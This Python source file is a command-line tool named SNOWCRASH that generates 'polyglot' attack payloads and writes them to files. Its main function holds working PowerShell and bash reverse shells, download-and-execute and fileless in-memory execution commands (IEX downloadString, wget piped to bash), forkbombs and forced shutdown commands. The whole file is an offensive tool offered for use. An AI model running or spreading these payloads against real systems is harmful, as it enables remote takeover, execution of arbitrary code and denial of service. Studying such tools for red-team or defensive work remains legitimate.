import argparse  # For command-line argument parsing
import os  # For OS-related functions like file handling
import sys  # For system-related functions
import random  # For random number generation
import time  # For time-related functions
import base64  # For base64 encoding/decoding
import socket  # For network-related functions
import readline  # For reading user input
from termcolor import colored  # For colored terminal output
from pyfiglet import Figlet  # For ASCII art generation
import texttable as tt  # For rendering tables in the terminal


# Display the application banner with ASCII art
def print_banner():
    f = Figlet(font='slant')
    banner = f.renderText('SNOWCRASH')
    print(colored(banner, 'blue', attrs=['bold']))
    print(colored("\t -- A polyglot payload generator --", 'cyan', attrs=['bold']))
    print("")


# Display a list of available payloads in a table format
def list_payloads():
    actions_data = [
        ["reverse_shell", "Spawn a reverse shell"],
        ["cmd_exec", "Execute a command"],
        ["forkbomb", "Run a forkbomb"],
        ["memexec", "Embed and execute a binary"],
        ["download_exec", "Download and execute a file"],
        ["shutdown", "Shutdown computer"],
        ["custom", "Use custom Bash and Powershell scripts"],
    ]

    table = tt.Texttable()
    table.set_deco(tt.Texttable.HEADER)
    table.set_cols_align(["c", "c"])
    table.add_rows([["NAME", "DESCRIPTION"]] + actions_data)

    print("")
    print("[*] Payloads: ")
    print(table.draw())
    print("")


# Color formatting functions
def red(text): return colored(text, 'red', attrs=['bold'])


def green(text): return colored(text, 'green', attrs=['bold'])


def cyan(text): return colored(text, 'cyan', attrs=['bold'])


def bold(text): return colored(text, attrs=['bold'])


# Print a success message in green
def print_good(msg):
    print(green("[+]"), msg)


# Print an informational message
def print_info(msg):
    print("[*]", msg)


# Print an error message in red
def print_error(msg):
    print(red("[x]"), msg)


# Print a header message in bold
def print_header(message):
    print(bold(f"-- {message} --"))
    print("")


# Check if an element exists in a list
def contains(lst, elem):
    return elem in lst


# Convert a string to an integer
def str_to_int(string_integer):
    return int(string_integer)


# Convert a time interval string to seconds
def interval_to_seconds(interval):
    period_letter = interval[-1]
    intr = interval[:-1]
    i = int(intr)
    if period_letter == "s":
        return i
    elif period_letter == "m":
        return i * 60
    elif period_letter == "h":
        return i * 3600
    return i


# Prompt the user for input with a default value
def input_prompt(name, message, default_value="none"):
    final_prompt = f"{red(name)} {message} (default: {default_value}): "
    line = input(final_prompt)
    if len(line) == 0:
        return default_value
    return line


# Write data to a file
def write_to_file(filename, data):
    try:
        with open(filename, 'w') as file:
            file.write(data)
        return True
    except Exception as e:
        print_error(f"[FILE WRITE ERROR]: {e}")
        sys.exit(0)


# Read data from a file and return it as a string
def read_file(filename):
    try:
        with open(filename, 'r') as file:
            return file.read()
    except Exception as e:
        print_error(f"[FILE READ ERROR]: {e}")
        sys.exit(0)


# Base64 decode a string
def base64_decode(b64_string):
    return base64.b64decode(b64_string).decode('utf-8')


# Base64 encode a string
def base64_encode(string):
    return base64.b64encode(string.encode('utf-8')).decode('utf-8')


# Get the local IP address of the machine
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        print_error(f"[IP RETRIEVAL ERROR]: {e}")
        return "127.0.0.1"


# Generate a random string of given length
def random_string(length):
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=length))


# Generate the specified payload with given parameters
def generate_payload(payload_name, sleep_interval, out, stdout):
    available_payloads = ["cmd_exec", "reverse_shell", "custom", "download_exec", "memexec", "shutdown", "forkbomb"]
    if payload_name not in available_payloads:
        print_error(f"No such payload: {payload_name}")
        sys.exit(0)

    polyglot_template = """# Polyglot payload template
# Sleep Interval: SLEEP_INTERVAL seconds

# Powershell Command
POWERSHELL_COMMAND

# Bash Command
BASH_COMMAND
"""

    polyglot_template = polyglot_template.replace("SLEEP_INTERVAL", str(interval_to_seconds(sleep_interval)))

    powershell = ""
    bash = ""

    print_header("PAYLOAD CUSTOMIZATION")
    if payload_name == "reverse_shell":
        powershell = "$client = New-Object System.Net.Sockets.TCPClient('HOST', PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        bash = "bash -i >& /dev/tcp/HOST/PORT 0>&1"

        host = input_prompt("[RHOST]", "Host to connect to", get_local_ip())
        port = input_prompt("[RPORT]", "Port to connect to", "4444")
        bash = bash.replace("HOST", host).replace("PORT", port)
        powershell = powershell.replace("HOST", host).replace("PORT", port)

    elif payload_name == "cmd_exec":
        command = input_prompt("[COMMAND]", "Command to execute", "calc")
        powershell = command
        bash = command

    elif payload_name == "custom":
        print_header("Bash Script")
        bash = input_prompt("[CUSTOM BASH]", "Custom Bash Script")
        print_header("Powershell Script")
        powershell = input_prompt("[CUSTOM POWERSHELL]", "Custom Powershell Script")

    elif payload_name == "download_exec":
        url = input_prompt("[URL]", "URL of file", "https://example.com/test.exe")
        bash = f"wget {url} -O /tmp/rev && chmod +x /tmp/rev && /tmp/rev &"
        powershell = f"(New-Object System.Net.WebClient).DownloadFile('{url}', $env:TEMP + '\\rev.exe');Start-Process ($env:TEMP + '\\rev.exe')"

    elif payload_name == "memexec":
        url = input_prompt("[URL]", "URL of file", "https://example.com/test.exe")
        powershell = f"IEX (New-Object Net.WebClient).downloadString('{url}')"
        bash = f"wget -qO- {url} | bash"

    elif payload_name == "shutdown":
        powershell = "Start-Sleep -s 1; Stop-Computer -Force"
        bash = "shutdown -h now"

    elif payload_name == "forkbomb":
        powershell = "for(;;){Start-Job -ScriptBlock {}}"
        bash = ":(){ :|:& };:"

    polyglot_template = polyglot_template.replace("POWERSHELL_COMMAND", powershell.replace("\\", "\\\\"))
    polyglot_template = polyglot_template.replace("BASH_COMMAND", bash.replace("\\", "\\\\"))

    if not out:
        out = random_string(12) + ".sc"

    print_good(f"Payload: {out}")
    if stdout:
        print("")
        print("[*] Polyglot Payload")
        print("")
        print(polyglot_template)

    write_to_file(out, polyglot_template)
    print_good(f"Payload written to file successfully: {out}")


def main():
    parser = argparse.ArgumentParser(description="A polyglot payload generator")
    parser.add_argument("-p", "--payload", help="Name of payload")
    parser.add_argument("-l", "--list", action="store_true", help="List available payloads")
    parser.add_argument("-s", "--stdout", action="store_true", help="Print payload to stdout")
    parser.add_argument("-i", "--interval", default="0s", help="Sleep interval")
    parser.add_argument("-o", "--out", help="Output file")

    args = parser.parse_args()

    print_banner()
    if args.list:
        list_payloads()
        sys.exit(0)

    if args.payload:
        generate_payload(args.payload, args.interval, args.out, args.stdout)


if __name__ == "__main__":
    main()
